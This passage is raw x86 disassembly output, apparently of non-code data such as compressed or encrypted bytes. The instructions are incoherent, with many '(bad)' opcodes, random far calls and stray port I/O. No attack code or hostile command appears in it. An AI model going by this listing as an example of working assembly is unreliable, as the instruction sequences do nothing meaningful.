  416dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dc0:	and    ch,BYTE PTR [eax+ebp*8+0x6b]
  416dc4:	(bad)  
  416dc6:	mov    ecx,0xcf98bbe
  416dcb:	pushf  
  416dcc:	loope  0x416df7
  416dce:	fcom   DWORD PTR [ecx-0x71]
  416dd1:	mov    bh,0x20
  416dd3:	js     0x416e28
  416dd5:	(bad)  
  416dd6:	aad    0x90
  416dd8:	mov    ecx,0x2492f992
  416ddd:	(bad)  
  416ddf:	int    0x64
  416de1:	xchg   DWORD PTR [edx+edi*1],eax
  416de4:	mov    ah,0x52
  416de6:	ins    BYTE PTR es:[edi],dx
  416de7:	adc    ebp,DWORD PTR [ecx]
  416de9:	pop    ds
  416dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416deb:	dec    ecx
  416dec:	add    ah,ah
  416dee:	xor    BYTE PTR [edi],ch
  416df0:	add    esi,DWORD PTR [edx]
  416df2:	push   0xfffffff9
  416df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df5:	jnp    0x416d8c
  416df7:	out    0xcb,al
  416df9:	jnp    0x416da2
  416dfb:	sbb    dl,BYTE PTR [esi-0x60]
  416dfe:	push   edi
  416dff:	pop    es
  416e00:	inc    ecx
  416e01:	call   0x36cd55d0
  416e06:	daa    
  416e07:	inc    edi
  416e08:	push   eax
  416e09:	xchg   ebp,eax
  416e0a:	(bad)  
  416e0b:	jecxz  0x416e08
  416e0d:	jb     0x416e34
  416e0f:	test   eax,0xc7cbda8
  416e14:	sub    al,0xd
  416e16:	mov    fs,WORD PTR [eax-0x5d]
  416e19:	faddp  st(7),st
  416e1b:	sbb    al,0x6b
  416e1d:	imul   ebp,ebx,0x7ac2660f
  416e23:	and    esp,DWORD PTR [ebp+edx*8+0x3963c781]
  416e2a:	xor    eax,0x1cc26f46
  416e2f:	push   ebp
  416e30:	into   
  416e31:	ss call 0x55dbf2f3
  416e37:	cmp    DWORD PTR [edi+0x2a35b196],0x7c2c87f6
  416e41:	inc    ebx
  416e42:	xchg   ecx,eax
  416e43:	xchg   cl,bh
  416e45:	mov    al,ds:0x71fc89df
  416e4a:	mov    ebp,0xbae322b4
  416e4f:	sahf   
  416e50:	retf   
  416e51:	adc    al,0xf6
  416e53:	cmp    al,0x71
  416e55:	lods   eax,DWORD PTR ds:[esi]
  416e56:	sbb    eax,0xde39708e
  416e5b:	shl    DWORD PTR [edx],1
  416e5d:	or     BYTE PTR ds:0xbc6eb950,0xf4
  416e64:	adc    eax,0x8c55e509
  416e69:	and    ebp,edi
  416e6b:	or     eax,0x1f9c08d
  416e70:	cmp    eax,0x8009f814
  416e75:	out    dx,al
  416e76:	mov    edx,?
  416e78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e79:	in     eax,0xe7
  416e7b:	pop    ebp
  416e7c:	xchg   ebp,eax
  416e7d:	gs loopne 0x416e2a
  416e80:	jno    0x416ef4
  416e82:	inc    ebx
  416e83:	adc    al,0x4d
  416e85:	jecxz  0x416e95
  416e87:	fsub   DWORD PTR [eax+0x89640d]
  416e8d:	inc    edx
  416e8e:	mov    DWORD PTR ds:0x548d009c,edi
  416e94:	es into 
  416e96:	inc    ebp
  416e97:	leave  
  416e98:	sbb    BYTE PTR [eax+0x69],ah
  416e9b:	dec    BYTE PTR [edi]
  416e9d:	adc    DWORD PTR [ebp+0x13],0x6f34d230
  416ea4:	popa   
  416ea5:	in     eax,dx
  416ea6:	scas   eax,DWORD PTR es:[edi]
  416ea7:	enter  0x6080,0xbb
  416eab:	bound  ebp,QWORD PTR [ecx+0x78]
  416eae:	clc    
  416eaf:	and    al,0x35
  416eb1:	xor    edx,DWORD PTR [ebx-0x7f]
  416eb4:	into   
  416eb5:	into   
  416eb6:	out    0x23,eax
  416eb8:	fs icebp 
  416eba:	in     eax,dx
  416ebb:	add    ah,ah
  416ebd:	push   ds
  416ebe:	lahf   
  416ebf:	hlt    
  416ec0:	add    ebx,DWORD PTR ds:0x9b0f03f8
  416ec6:	dec    esi
  416ec7:	(bad)  
  416ec8:	mov    eax,ds:0x85fc4226
  416ecd:	cmp    al,0x66
  416ecf:	(bad)  
  416ed0:	fidivr WORD PTR [edi+0x36b6a591]
  416ed6:	mov    ch,0x15
  416ed8:	push   es
  416ed9:	fwait
  416eda:	pop    ds
  416edb:	or     esp,DWORD PTR [ebp-0x56ba7323]
  416ee1:	cdq    
  416ee2:	dec    ebp
  416ee3:	add    al,0xae
  416ee5:	inc    ecx
  416ee6:	outs   dx,BYTE PTR ds:[esi]
  416ee7:	sbb    esi,ebp
  416ee9:	ins    DWORD PTR es:[edi],dx
  416eea:	ins    BYTE PTR es:[edi],dx
  416eeb:	out    0x88,al
  416eed:	call   0xd6f9:0x583e93da
  416ef4:	int3   
  416ef5:	out    dx,al
  416ef6:	sbb    eax,0x45ca1b66
  416efb:	mov    ebx,DWORD PTR [esi]
  416efd:	add    al,0x5b
  416eff:	int3   
  416f00:	lods   eax,DWORD PTR ds:[esi]
  416f01:	pop    esp
  416f02:	inc    ebx
  416f03:	adc    bh,BYTE PTR [edi]
  416f05:	out    dx,al
  416f06:	test   al,0x77
  416f08:	dec    edi
  416f09:	cmp    BYTE PTR [ebp+0x20],bh
  416f0c:	fisubr WORD PTR [eax-0xb402]
  416f12:	test   BYTE PTR [eax],dh
  416f14:	call   0x92b2:0x3e4d3930
  416f1b:	and    ah,cl
  416f1d:	stc    
  416f1e:	or     al,0x74
  416f20:	mov    edi,0xc8902993
  416f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f26:	mov    BYTE PTR [eax+0x3f89a11b],dh
  416f2c:	mov    ebp,DWORD PTR [eax-0xe23efc5]
  416f32:	cmp    eax,0x2bfe0410
  416f37:	add    ch,bl
  416f39:	push   esi
  416f3a:	cmp    al,0x49
  416f3c:	add    DWORD PTR [edi+0x4b],ebp
  416f3f:	arpl   WORD PTR ds:0x3abaf43c,dx
  416f45:	push   ebp
  416f46:	(bad)  ds:0xd7e90f
  416f4c:	adc    DWORD PTR [ebx+0x7],eax
  416f4f:	mov    eax,ds:0xba39ad7a
  416f54:	test   BYTE PTR [ecx+0xf],dh
  416f57:	nop
  416f58:	lds    eax,FWORD PTR [esi-0x509a5976]
  416f5e:	sbb    esi,DWORD PTR [ecx+edx*2-0x4b157952]
  416f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f66:	(bad)  
  416f68:	pop    ecx
  416f69:	xor    DWORD PTR [esi],edx
  416f6b:	sub    DWORD PTR ds:0x7794d043,ebx
  416f71:	xchg   esp,eax
  416f72:	scas   eax,DWORD PTR es:[edi]
  416f73:	mov    ds:0xa832eb3c,eax
  416f78:	mov    al,ds:0x6ffebd98
  416f7d:	push   ds
  416f7e:	xor    al,0x4b
  416f80:	mov    ebp,0x9edd860
  416f85:	cmp    edx,DWORD PTR [edx-0x38]
  416f88:	mov    ch,0x5c
  416f8a:	mov    ebp,0xd24ece50
  416f8f:	(bad)  
  416f90:	fwait
  416f91:	jbe    0x416ffd
  416f93:	aad    0x4d
  416f95:	sbb    cl,BYTE PTR [ebp+0x4c3ae385]
  416f9b:	aas    
  416f9c:	loope  0x416fe1
  416f9e:	jo     0x416f8e
  416fa0:	imul   edi,DWORD PTR [esi],0xc3d2fb28
  416fa6:	mov    cl,0x6
  416fa8:	jbe    0x416f96
  416faa:	jbe    0x416ffe
  416fac:	sbb    eax,0xbea43ad2
  416fb1:	dec    edx
  416fb2:	cmp    al,0x1b
  416fb4:	xchg   ecx,eax
  416fb5:	ins    DWORD PTR es:[edi],dx
  416fb6:	mov    BYTE PTR [esi+esi*8-0x24a43a41],bh
  416fbd:	mov    ebp,ebp
  416fbf:	or     eax,0xfb3742e0
  416fc4:	int3   
  416fc5:	mov    ds:0x5431f996,al
  416fca:	xchg   ah,dh
  416fcc:	fst    DWORD PTR [edx]
  416fce:	jnp    0x416ff4
  416fd0:	and    dh,BYTE PTR [ecx-0x3f]
  416fd3:	xchg   ecx,eax
  416fd4:	sbb    al,0xb7
  416fd6:	dec    edi
  416fd7:	dec    esp
  416fd8:	mov    BYTE PTR [eax],cl
  416fda:	push   ds
  416fdb:	call   DWORD PTR [esi+0x72deafb1]
  416fe1:	or     DWORD PTR [esi],eax
  416fe3:	xchg   BYTE PTR [eax+0x398cd555],al
  416fe9:	mov    DWORD PTR [ebx],ebx
  416feb:	or     ecx,DWORD PTR [esi+ebx*1+0x77]
  416fef:	outs   dx,DWORD PTR ds:[esi]
  416ff0:	ins    DWORD PTR es:[edi],dx
  416ff1:	mov    al,0xea
  416ff3:	ret    
  416ff4:	push   es
  416ff5:	mov    bl,BYTE PTR [edx]
  416ff7:	mov    edi,0x690142e6
  416ffc:	fadd   DWORD PTR [ebx+0x7b12fd1b]
  417002:	dec    eax
  417003:	add    al,0x33
  417005:	loope  0x416f97
  417007:	imul   edx,DWORD PTR [edx-0xd89204f],0x5a
  41700e:	cmc    
  41700f:	in     eax,0x1a
  417011:	xchg   ebp,eax
  417012:	cld    
  417013:	push   0x1f97ac89
  417018:	aad    0x61
  41701a:	fcomi  st,st(3)
  41701c:	daa    
  41701d:	and    al,BYTE PTR [esi+eiz*2]
  417020:	push   esi
  417021:	inc    ebx
  417022:	inc    esp
  417023:	test   DWORD PTR [edx],eax
  417025:	dec    ecx
  417026:	dec    edx
  417027:	int3   
  417028:	cmp    al,0xd0
  41702a:	popf   
  41702b:	jle    0x417048
  41702d:	pop    ecx
  41702e:	out    dx,al
  41702f:	test   eax,0xf01b349d
  417034:	adc    DWORD PTR [esi-0x7a],esi
  417037:	jo     0x4170aa
  417039:	shl    DWORD PTR [ebp+0x14cefec0],cl
  41703f:	push   ebp
  417040:	cli    
  417041:	adc    al,0x5d
  417043:	popf   
  417044:	fidiv  DWORD PTR ds:0xb8efda6d
  41704a:	jno    0x4170ae
  41704c:	xor    BYTE PTR [edx-0x57cc39f],ah
  417052:	pop    esp
  417053:	aam    0x49
  417055:	dec    eax
  417056:	sahf   
  417057:	dec    eax
  417058:	xchg   ebp,eax
  417059:	neg    dh
  41705b:	inc    ah
  41705d:	dec    DWORD PTR [edi+eiz*4+0x1fb9f47a]
  417064:	push   edi
  417065:	shl    BYTE PTR [edi+0x6d3e8747],cl
  41706b:	pop    ebx
  41706c:	push   edx
  41706d:	sub    cl,cl
  41706f:	dec    ecx
  417070:	stos   DWORD PTR es:[edi],eax
  417071:	push   0x34
  417073:	dec    edi
  417074:	pop    edi
  417075:	ja     0x41704d
  417077:	push   eax
  417078:	xor    BYTE PTR [ebx-0x7c],dh
  41707b:	jge    0x4170aa
  41707d:	sub    dl,BYTE PTR [esi-0x5c]
  417080:	sbb    BYTE PTR [esp+eiz*2+0xa],al
  417084:	xor    al,0xd0
  417086:	ss ins BYTE PTR es:[edi],dx
  417088:	pop    eax
  417089:	cmp    esp,DWORD PTR [ebx+0x48201ef6]
  41708f:	xchg   BYTE PTR [edi],cl
  417091:	inc    esi
  417092:	shl    BYTE PTR [ecx-0x65],0xa2
  417096:	pop    ss
  417097:	lea    edx,[edx+0x3d]
  41709a:	in     al,dx
  41709b:	jns    0x41710e
  41709d:	jge    0x417083
  41709f:	loope  0x4170dd
  4170a1:	sub    al,0x9d
  4170a3:	mov    dh,0x13
  4170a5:	jmp    0x2e28290b
  4170aa:	mov    dl,0xb9
  4170ac:	mov    eax,DWORD PTR [edx+ebx*1]
  4170af:	pop    ecx
  4170b0:	nop
  4170b1:	mov    cs,WORD PTR [eax+esi*8-0x7469432]
  4170b8:	push   0x92dbba5e
  4170bd:	jecxz  0x4170ad
  4170bf:	popa   
  4170c0:	jnp    0x417070
  4170c2:	scas   eax,DWORD PTR es:[edi]
  4170c3:	stos   DWORD PTR es:[edi],eax
  4170c4:	and    ch,bl
  4170c6:	sub    edi,DWORD PTR [esp+esi*4+0x11970938]
  4170cd:	sbb    bl,BYTE PTR [ebx+0x5]
  4170d0:	aad    0x2e
  4170d2:	and    eax,0xf040b073
  4170d7:	arpl   WORD PTR [esi],sp
  4170d9:	jo     0x4170a2
  4170db:	push   ebx
  4170dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170dd:	(bad)  
  4170de:	leave  
  4170df:	xor    eax,0x127b15ee
  4170e4:	inc    ebx
  4170e5:	cmp    esi,eax
  4170e7:	pop    ebp
  4170e8:	dec    ecx
  4170e9:	or     BYTE PTR [edx+0x145a4323],0x3
  4170f0:	dec    ecx
  4170f1:	cmp    DWORD PTR cs:[edi-0x6dae438a],edi
  4170f8:	not    BYTE PTR [edi+ecx*2+0x4e4d4fa3]
  4170ff:	dec    ebp
  417100:	sub    ch,BYTE PTR [edx+0x3a]
  417103:	cmp    ebp,ebx
  417105:	lahf   
  417106:	or     edx,DWORD PTR [edi+0x5d]
  417109:	jle    0x417113
  41710b:	push   eax
  41710c:	xor    bh,BYTE PTR [ebp+edx*8+0x4d4856e]
  417113:	out    0x77,eax
  417115:	dec    ecx
  417116:	lods   al,BYTE PTR ds:[esi]
  417117:	in     eax,0x2b
  417119:	inc    ebx
  41711a:	dec    ebp
  41711b:	outs   dx,BYTE PTR ds:[esi]
  41711c:	cli    
  41711d:	add    esi,esi
  41711f:	mov    BYTE PTR [eax-0x5198b418],bl
  417125:	fmul   DWORD PTR [ebp+0x7c7391aa]
  41712b:	sar    DWORD PTR [ecx-0x29],cl
  41712e:	int3   
  41712f:	pop    edx
  417130:	sbb    edx,DWORD PTR [edx-0x2]
  417133:	dec    edi
  417134:	xchg   esp,eax
  417135:	popf   
  417136:	fild   DWORD PTR [edi-0x39235ba6]
  41713c:	mov    WORD PTR [ebx+0x74c5eb53],cs
  417142:	xlat   BYTE PTR ds:[ebx]
  417143:	and    eax,0x85cffe20
  417148:	cmp    bh,dh
  41714a:	pop    edi
  41714b:	inc    esp
  41714c:	das    
  41714d:	out    dx,eax
  41714e:	or     al,0xa4
  417150:	ret    0xefd3
  417153:	and    BYTE PTR [edi],0x9d
  417156:	shr    DWORD PTR [ecx-0x3a],1
  417159:	fcmovnbe st,st(3)
  41715b:	mov    eax,ds:0xc57bb0b4
  417160:	dec    esp
  417161:	pushf  
  417162:	call   0x53946ba1
  417167:	push   0xffffffc0
  417169:	ja     0x41713b
  41716b:	test   ch,dl
  41716d:	sbb    dl,bh
  41716f:	jne    0x41714e
  417171:	pop    es
  417172:	sub    bl,BYTE PTR [ecx+0x78]
  417175:	cmc    
  417176:	fdiv   DWORD PTR [ebp+0x3]
  417179:	push   edi
  41717a:	into   
  41717b:	sub    al,0x74
  41717d:	jae    0x41717d
  41717f:	(bad)  
  417181:	sbb    edx,edi
  417183:	jae    0x4171a7
  417185:	dec    esi
  417186:	cmc    
  417187:	popf   
  417188:	sbb    ecx,DWORD PTR [ebx+0x59]
  41718b:	mov    esp,0xa247e4e
  417190:	mov    ch,0xc0
  417192:	cmp    dl,BYTE PTR [eax]
  417194:	push   0xc538277
  417199:	sti    
  41719a:	and    al,0x6b
  41719c:	ror    dl,0xb0
  41719f:	mov    bh,0x29
  4171a1:	mov    dh,0x94
  4171a3:	ja     0x41712d
  4171a5:	jae    0x417154
  4171a7:	sbb    al,0x6b
  4171a9:	pop    ds
  4171aa:	inc    edx
  4171ab:	rcl    BYTE PTR [edi-0x29],1
  4171ae:	add    eax,0xad48af87
  4171b3:	rol    DWORD PTR [edi-0x6425dc63],cl
  4171b9:	leave  
  4171ba:	mov    eax,0x65379be0
  4171bf:	mov    eax,ds:0x573159b7
  4171c4:	addr16 jmp 0x4171f3
  4171c7:	add    ah,dl
  4171c9:	(bad)  
  4171ca:	in     al,0xad
  4171cc:	or     al,0xf6
  4171ce:	out    0xda,eax
  4171d0:	jae    0x417199
  4171d2:	iret   
  4171d3:	dec    edi
  4171d4:	pop    ecx
  4171d5:	push   es
  4171d6:	rcl    dl,cl
  4171d8:	xor    eax,0x374af7de
  4171dd:	push   edi
  4171de:	int3   
  4171df:	shr    BYTE PTR [edi+0x65],0x96
  4171e3:	shl    dl,0x21
  4171e6:	je     0x417184
  4171e8:	xchg   ebp,eax
  4171e9:	sti    
  4171ea:	inc    ecx
  4171eb:	ror    DWORD PTR [ecx-0x22],1
  4171ee:	xor    DWORD PTR [edi+ecx*1+0x0],ebx
  4171f2:	outs   dx,DWORD PTR ds:[esi]
  4171f3:	dec    ebx
  4171f4:	les    ecx,FWORD PTR [ecx+0x13d04e26]
  4171fa:	cmp    bl,BYTE PTR [edx]
  4171fc:	and    al,bl
  4171fe:	stos   BYTE PTR es:[edi],al
  4171ff:	shl    DWORD PTR [edx-0x5],1
  417202:	mov    fs,WORD PTR [ebx+edx*8+0x34]
  417206:	pop    ds
  417207:	sub    BYTE PTR [eax-0x57],bh
  41720a:	xlat   BYTE PTR ds:[ebx]
  41720b:	push   esi
  41720c:	xor    DWORD PTR [ebx],esi
  41720e:	ds inc ebp
  417210:	shl    edx,cl
  417212:	push   ebx
  417213:	push   ebx
  417214:	adc    DWORD PTR [ebx-0x61],esi
  417217:	retf   
  417218:	popa   
  417219:	jl     0x41725a
  41721b:	rcl    DWORD PTR [edi-0x69],1
  41721e:	adc    al,0x67
  417220:	sub    dh,cl
  417222:	cmp    bl,BYTE PTR [eax]
  417224:	test   al,0x95
  417226:	pop    edx
  417227:	adc    eax,0xfb8b026
  41722c:	xor    eax,DWORD PTR [ecx-0x58]
  41722f:	sbb    BYTE PTR [ebx],dl
  417231:	sbb    edi,ebx
  417233:	jbe    0x417200
  417235:	js     0x4171bc
  417237:	retf   
  417238:	add    DWORD PTR [ebx-0x5a8e0f15],0x3845d5d6
  417242:	adc    ah,BYTE PTR fs:[ebp+0x47885422]
  417249:	add    bl,BYTE PTR [eax+0x678ebef3]
  41724f:	daa    
  417250:	das    
  417251:	fidivr DWORD PTR [ebx-0x2d]
  417254:	bound  edx,QWORD PTR [esi]
  417256:	pusha  
  417257:	xor    al,0x69
  417259:	xor    eax,0xb6a36da7
  41725e:	push   esp
  41725f:	into   
  417260:	ja     0x417235
  417262:	(bad)  
  417263:	xor    al,0x6f
  417265:	push   esi
  417266:	push   ebp
  417267:	xor    al,BYTE PTR [ebx+0x7f16b32]
  41726d:	mov    ch,bl
  41726f:	cld    
  417270:	push   ss
  417271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417272:	mov    ebx,0xd9a6879c
  417277:	pop    eax
  417278:	test   al,0x90
  41727a:	ins    BYTE PTR es:[edi],dx
  41727b:	xor    eax,0xa7c76f74
  417280:	test   DWORD PTR [eax-0x607ec1da],0x2ddf1877
  41728a:	mov    al,ds:0x79b22697
  41728f:	mov    BYTE PTR ds:0xa091ef02,dl
  417295:	and    al,0x6
  417297:	pop    ss
  417298:	mov    esi,0x320d2575
  41729d:	jmp    0x4172cd
  41729f:	cmp    eax,edi
  4172a1:	add    al,0xb2
  4172a3:	dec    edx
  4172a4:	shl    DWORD PTR [eax],1
  4172a6:	(bad)
  4172a9:	daa    
  4172aa:	dec    esi
  4172ab:	jg     0x4172d7
  4172ad:	mov    edx,0x53107de9
  4172b2:	rcr    dh,1
  4172b4:	neg    DWORD PTR [eax-0x6bee3df3]
  4172ba:	xchg   esp,eax
  4172bb:	dec    edi
  4172bc:	leave  
  4172bd:	or     edx,DWORD PTR ds:0xe9f4d9df
  4172c3:	rcl    BYTE PTR [edx],1
  4172c5:	arpl   WORD PTR [ebp+0x1dcdd152],si
  4172cb:	sbb    DWORD PTR [ebx+0xd],0xfffffff7
  4172cf:	adc    ebx,edx
  4172d1:	or     ah,BYTE PTR [esi+eax*4]
  4172d4:	inc    esp
  4172d5:	jge    0x417289
  4172d7:	add    ch,BYTE PTR [edx-0x5dfdf0ab]
  4172dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172de:	out    0x60,al
  4172e0:	cli    
  4172e1:	push   edi
  4172e2:	aam    0x50
  4172e4:	mov    ah,0xab
  4172e6:	xchg   esp,eax
  4172e7:	retf   
  4172e8:	jne    0x41735b
  4172ea:	cmp    eax,0x40a842d1
  4172ef:	or     ch,BYTE PTR gs:[eax]
  4172f2:	(bad)  
  4172f4:	ss xchg esp,eax
  4172f6:	push   ss
  4172f7:	or     ebx,DWORD PTR [ecx]
  4172f9:	mov    edi,0x625aee4e
  4172fe:	pop    ebx
  4172ff:	dec    ebx
  417300:	popf   
  417301:	out    0xc4,al
  417303:	mov    esp,0x8c3ad729
  417308:	cmp    edi,esp
  41730a:	add    eax,0xc1a12fa
  41730f:	cmp    edi,DWORD PTR [esi]
  417311:	dec    eax
  417312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417313:	ins    BYTE PTR es:[edi],dx
  417314:	dec    esp
  417315:	add    eax,0x896ea353
  41731a:	dec    esp
  41731b:	mov    cl,0x42
  41731d:	(bad)  
  41731e:	test   eax,0x18402288
  417323:	imul   ebx,edx,0xfffffff3
  417326:	inc    ebp
  417327:	dec    ebx
  417328:	in     eax,0xc9
  41732a:	cmp    ebp,DWORD PTR [edx-0x6c]
  41732d:	mov    dl,0xf8
  41732f:	add    al,BYTE PTR [ebx-0x80]
  417332:	push   eax
  417333:	pop    esp
  417334:	js     0x417332
  417336:	sbb    al,0x35
  417338:	dec    eax
  417339:	adc    DWORD PTR [ebp-0x5b],edx
  41733c:	outs   dx,DWORD PTR ds:[esi]
  41733d:	push   edx
  41733e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  417340:	and    dh,ch
  417342:	mul    DWORD PTR [ebp-0x25]
  417345:	mov    ebx,DWORD PTR [esi-0x3c49a5c4]
  41734b:	mov    BYTE PTR [ebx-0x55],dl
  41734e:	sahf   
  41734f:	inc    ebx
  417350:	adc    DWORD PTR cs:[ecx+0x42f536eb],ebp
  417357:	and    cl,dl
  417359:	call   0xf22076d3
  41735e:	ja     0x417367
  417360:	xchg   edx,eax
  417361:	in     al,dx
  417362:	inc    esi
  417363:	cmp    dh,bl
  417365:	jns    0x4173d8
  417367:	sbb    DWORD PTR [edi+0x32],esp
  41736a:	sub    DWORD PTR ds:0x6a400abc,ebx
  417370:	das    
  417371:	or     ch,BYTE PTR [edi-0x1e]
  417374:	dec    ebx
  417375:	push   es
  417376:	cmp    DWORD PTR [ebx],ecx
  417378:	jmp    0x26189c51
  41737d:	or     bh,dh
  41737f:	jnp    0x4173ec
  417381:	push   eax
  417382:	mov    dh,0xfd
  417384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417385:	lods   al,BYTE PTR ds:[esi]
  417386:	(bad)  
  417387:	xor    ch,BYTE PTR [edi-0x23f93a13]
  41738d:	std    
  41738e:	repz sub ch,BYTE PTR [ebx+0x3a]
  417392:	mov    eax,0xffaf96df
  417397:	(bad)  
  417398:	dec    ebp
  417399:	pop    esi
  41739a:	adc    BYTE PTR [esi],bl
  41739c:	retf   
  41739d:	in     eax,0x45
  41739f:	and    al,0x7c
  4173a1:	pop    ecx
  4173a2:	or     eax,0xc3744636
  4173a7:	stos   DWORD PTR es:[edi],eax
  4173a8:	and    bh,cl
  4173aa:	and    ch,BYTE PTR [esi+eiz*4-0x59]
  4173ae:	mov    dl,0x7
  4173b0:	das    
  4173b1:	xchg   edx,eax
  4173b2:	outs   dx,BYTE PTR ds:[esi]
  4173b3:	(bad)  [ebx+ebp*1]
  4173b6:	cs (bad) 
  4173b8:	(bad)  
  4173ba:	aad    0xfb
  4173bc:	xchg   esi,eax
  4173bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173be:	xchg   ebp,eax
  4173bf:	mov    ds:0x866953a2,al
  4173c4:	mov    ebp,DWORD PTR [edx-0xa]
  4173c7:	cdq    
  4173c8:	shr    BYTE PTR [ecx+eiz*4+0x37],0x19
  4173cd:	clc    
  4173ce:	arpl   WORD PTR [edi+ebx*8-0x3a4dbf9b],di
  4173d5:	cmc    
  4173d6:	jmp    0x4173f8
  4173d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173d9:	jmp    0x1baa:0x6500153f
  4173e0:	in     al,0x7f
  4173e2:	mov    DWORD PTR [edx-0x68fe90fb],eax
  4173e8:	sbb    edi,eax
  4173ea:	push   ss
  4173eb:	fwait
  4173ec:	mov    BYTE PTR [esi+0x4b],dh
  4173ef:	add    al,0xeb
  4173f1:	pop    esp
  4173f2:	add    eax,DWORD PTR [ebx-0xeb681a3]
  4173f8:	idiv   BYTE PTR [ebp+0x55069ce4]
  4173fe:	stos   BYTE PTR es:[edi],al
  4173ff:	pop    esi
  417400:	fs mov bh,0xa0
  417403:	push   esp
  417404:	inc    ebx
  417405:	mov    ds:0xab4743b5,al
  41740a:	cmc    
  41740b:	dec    BYTE PTR [ebx-0x40d85699]
  417411:	les    edx,FWORD PTR [ebx-0xaafe698]
  417417:	push   ebp
  417418:	scas   al,BYTE PTR es:[edi]
  417419:	rcr    DWORD PTR [ecx-0xd0a0fef],cl
  41741f:	xlat   BYTE PTR ds:[ebx]
  417420:	jge    0x41745d
  417422:	mov    cl,0x38
  417424:	sbb    al,0xd2
  417426:	inc    eax
  417427:	out    0xdd,al
  417429:	ins    BYTE PTR es:[edi],dx
  41742a:	mov    al,dl
  41742c:	sbb    ebx,DWORD PTR [ecx-0x6]
  41742f:	add    ebx,esp
  417431:	aam    0x5d
  417433:	push   esi
  417434:	pop    ss
  417435:	hlt    
  417436:	push   0x54
  417438:	mov    ah,0x76
  41743a:	lahf   
  41743b:	je     0x41742a
  41743d:	aad    0xc4
  41743f:	sbb    cl,dh
  417441:	and    ah,BYTE PTR [esi]
  417443:	mov    al,0xc1
  417445:	es inc ebx
  417447:	pop    eax
  417448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417449:	out    dx,al
  41744a:	xor    dl,0x42
  41744d:	gs pop eax
  41744f:	fnstsw WORD PTR [ebp+0x54a65dd1]
  417455:	imul   edx,DWORD PTR [eax],0x59
  417458:	cdq    
  417459:	inc    ebx
  41745a:	in     al,dx
  41745b:	add    cl,bh
  41745d:	mov    esi,ebp
  41745f:	rcr    BYTE PTR [edi-0x17228686],0x2
  417466:	nop
  417467:	xchg   DWORD PTR [edx],eax
  417469:	(bad)  
  41746a:	mov    esi,0x4054c054
  41746f:	lds    esi,FWORD PTR [edi+0x24eff915]
  417475:	call   0x57a0:0x39a44f3d
  41747c:	outs   dx,BYTE PTR ds:[esi]
  41747d:	(bad)  
  41747e:	(bad)  
  41747f:	jmp    0x4174d6
  417481:	je     0x4174b0
  417483:	xchg   eax,edi
  417485:	ds aam 0x3d
  417488:	daa    
  417489:	enter  0x2887,0x2
  41748d:	sbb    DWORD PTR [esi-0x6428c0ff],edx
  417493:	scas   eax,DWORD PTR es:[edi]
  417494:	mov    ebx,ecx
  417496:	or     eax,0xc10086b2
  41749b:	ins    DWORD PTR es:[edi],dx
  41749c:	sbb    eax,0xdf501c00
  4174a1:	sub    cl,BYTE PTR [edx-0x7b6ac8ad]
  4174a7:	mov    gs,WORD PTR [ecx]
  4174a9:	enter  0x73ab,0x41
  4174ad:	in     al,dx
  4174ae:	sub    al,ch
  4174b0:	pop    ss
  4174b1:	mov    ah,0xf7
  4174b3:	pop    ds
  4174b4:	imul   ebp,DWORD PTR [eax+0xb],0x2e
  4174b8:	dec    eax
  4174b9:	add    BYTE PTR [ebp+0x19ecbcab],0x9
  4174c0:	mov    dh,0x24
  4174c2:	mov    esp,0xea662e74
  4174c7:	sti    
  4174c8:	jb     0x4174f0
  4174ca:	adc    al,0x9c
  4174cc:	leave  
  4174cd:	xor    edi,DWORD PTR [esi+ebp*2-0x13a3796e]
  4174d4:	ins    BYTE PTR es:[edi],dx
  4174d5:	popf   
  4174d6:	push   esi
  4174d7:	push   esi
  4174d8:	push   ss
  4174d9:	(bad)  
  4174da:	cmp    ecx,DWORD PTR [eax-0x3ab2f9ce]
  4174e0:	out    dx,eax
  4174e1:	pop    ebp
  4174e2:	pop    eax
  4174e3:	outs   dx,DWORD PTR ds:[esi]
  4174e4:	icebp  
  4174e5:	ins    DWORD PTR es:[edi],dx
  4174e6:	inc    ebx
  4174e7:	and    ch,dl
  4174e9:	or     ebx,DWORD PTR ds:0x34c6f6ac
  4174ef:	add    edx,DWORD PTR [edx-0x7]
  4174f2:	adc    bh,bh
  4174f4:	mov    ds:0x4ab8d991,eax
  4174f9:	sbb    eax,0xcd456205
  4174fe:	xchg   ecx,eax
  4174ff:	jbe    0x4174c1
  417501:	outs   dx,BYTE PTR ds:[esi]
  417502:	stos   DWORD PTR es:[edi],eax
  417503:	not    BYTE PTR ds:0xf43dee37
  417509:	mov    cl,0xba
  41750b:	pop    ds
  41750c:	mov    eax,ds:0x4faadc54
  417511:	outs   dx,BYTE PTR ds:[esi]
  417512:	add    BYTE PTR [edx],dl
  417514:	xchg   ebx,eax
  417515:	aaa    
  417516:	bound  eax,QWORD PTR [ecx+0x75f5892f]
  41751c:	sti    
  41751d:	rcr    bl,cl
  41751f:	loopne 0x417543
  417521:	scas   eax,DWORD PTR es:[edi]
  417522:	rcr    ch,1
  417524:	xchg   esp,eax
  417525:	loope  0x4174ef
  417527:	es pop es
  417529:	dec    ebp
  41752a:	or     DWORD PTR [esi],0x9daa0818
  417530:	mov    dh,0xce
  417532:	das    
  417533:	inc    eax
  417534:	pop    edx
  417535:	mov    ebx,0x997741c
  41753a:	and    bl,BYTE PTR ds:0x7aefe02f
  417540:	or     dh,BYTE PTR [esi]
  417542:	and    DWORD PTR [ecx-0x7272b6d],ebp
  417548:	xor    eax,0x91f40fe6
  41754d:	addr16 popf 
  41754f:	pop    edx
  417550:	out    dx,eax
  417551:	dec    edi
  417552:	and    ch,dh
  417554:	out    0x3,al
